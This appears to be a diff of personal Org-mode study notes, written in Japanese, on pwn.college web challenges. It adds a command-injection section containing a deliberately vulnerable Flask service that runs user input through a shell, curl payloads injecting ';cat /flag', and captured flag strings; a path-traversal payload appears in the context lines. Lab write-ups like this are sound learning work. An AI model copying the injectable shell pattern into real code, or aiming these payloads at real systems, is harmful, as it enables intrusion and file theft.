@@ -41,9 +41,9 @@ CLOSED: [2026-06-09 火 23:32]
 - CLOSING NOTE [2026-06-09 火 23:32] \\
   fortunes を見落していてなかなか解けなかった...
 
-  #+begin_example
+  #+begin_comment
   pwn.college{kKM0dpmyBsNbIWN2_DdICoYE9yq.dJjN1YDL2AjNyMzW}
-  #+end_example
+  #+end_comment
 
   #+begin_example
   DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
@@ -91,3 +91,64 @@ curl "challenge.localhost/serve/fortunes/..%2F..%2F..%2Fflag"
 #+end_src
 ** 参考
 1. [[https://blog.hamayanhamayan.com/entry/2021/12/08/220449][CTFのWebセキュリティにおけるPath Traversal, LFI/RFI (File Upload, ZipSlip) - はまやんはまやんはまやん]]
+* CMDi 1
+:LOGBOOK:
+- Note taken on [2026-06-10 水 09:16] \\
+  #+begin_comment
+  pwn.college{YYdXJaz4HORdyee8PwfGkKYvTQ-.dVjN1YDL2AjNyMzW}
+  #+end_comment
+:END:
+~;~ を先頭に入れると直前のコマンドを終了させて、任意のコードを実行できる。
+
+#+NAME: server
+#+begin_src python
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/resource", methods=["GET"])
+def challenge():
+    arg = flask.request.args.get("dir", "/challenge")
+    command = f"ls -l {arg}"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/resource"><input type=text name=dir><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
+#+end_src
+
+スペースを他の文字に置き換える必要がある。
+
+#+begin_src shell
+curl "http://challenge.localhost:80/resource?dir=;cat%20/flag"
+#+end_src
+
+#+begin_src shell
+curl "http://challenge.localhost:80/resource?dir=;cat</flag"
+#+end_src
